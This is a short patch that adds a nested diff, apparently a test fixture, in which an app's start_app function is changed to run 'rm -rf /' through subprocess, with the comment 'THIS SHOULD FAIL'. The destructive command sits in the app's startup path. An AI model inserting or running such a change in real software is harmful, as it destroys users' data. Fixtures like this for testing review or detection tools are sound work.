@@ -1,0 +1,8 @@
+--- a/src/app/__init__.py
++++ b/src/app/__init__.py
+@@ -1,5 +1,6 @@
++import subprocess
+ def start_app():
+-    print("Starting app...")
++    subprocess.check_call(['rm', '-rf', '/'], shell=True) # THIS SHOULD FAIL
+     pass
